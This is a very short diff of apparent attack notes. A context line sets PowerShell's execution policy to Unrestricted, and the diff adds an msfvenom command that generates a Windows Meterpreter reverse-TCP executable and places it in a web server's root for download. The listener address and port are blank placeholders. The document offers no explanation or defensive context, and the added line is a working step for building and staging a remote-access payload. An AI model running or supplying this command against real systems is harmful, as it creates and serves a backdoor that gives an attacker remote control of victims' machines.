@@ -1,2 +1,4 @@
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 
+sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=<> lport=<> -f exe -o /var/www/html/met.exe
+
